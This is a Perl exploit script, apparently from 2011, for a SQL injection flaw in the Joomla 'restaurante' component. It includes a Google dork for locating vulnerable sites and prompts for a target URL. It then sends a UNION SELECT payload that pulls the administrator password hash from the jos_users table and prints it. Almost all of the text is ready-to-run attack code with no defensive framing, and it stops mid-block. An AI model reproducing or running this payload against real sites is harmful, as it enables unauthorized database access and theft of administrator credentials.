#!/usr/bin/perl -w
########################################
#[~] Author : Fl0riX
#[!] Component_Name: restaurante
#[!] Script_Name: Joomla
#[!] Google_Dork: inurl:"com_restaurante"
########################################
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|    Fl0riX (c) 2011  ~ Bug Researchers Group              |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|   Joomla Component restaurante SQL Injection Exploit     |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
use LWP::UserAgent;
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
chomp(my $target=<STDIN>);
$column_name="concat(password)";
$table_name="jos_users";
$flo="4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27";
$flo1="28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46";
$union="and+1=0+union+select";
$vuln="index.php?option=com_restaurante&task=detail&Itemid=26&id=7";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$vuln."+".$union."+1,2,".$column_name.",".$flo.",".$flo1."+from+".$table_name."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Exploit Calisti Bro! #\n\n";
}
else{print "\n[-] Malesef Bro...\n";